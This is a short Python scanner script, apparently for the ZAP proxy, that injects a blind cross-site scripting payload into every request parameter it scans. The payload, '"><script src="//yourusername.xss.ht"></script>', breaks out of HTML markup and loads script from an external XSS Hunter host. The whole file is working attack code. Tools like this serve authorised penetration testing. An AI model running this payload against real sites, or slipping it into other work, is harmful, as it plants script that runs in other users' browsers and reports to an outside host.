# by: Khaled Nassar @knassar702

# YOUR XSSHUNTER PAYLOAD
bxss = '"><script src="//yourusername.xss.ht"></script>'
def scanNode(sas, msg):
  pass


def scan(sas, msg, param, value):

  # Copy requests before reusing them
  msg = msg.cloneRequest();

  # setParam (message, parameterName, newValue)
  sas.setParam(msg, param, bxss);

  # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
  sas.sendAndReceive(msg, False, False);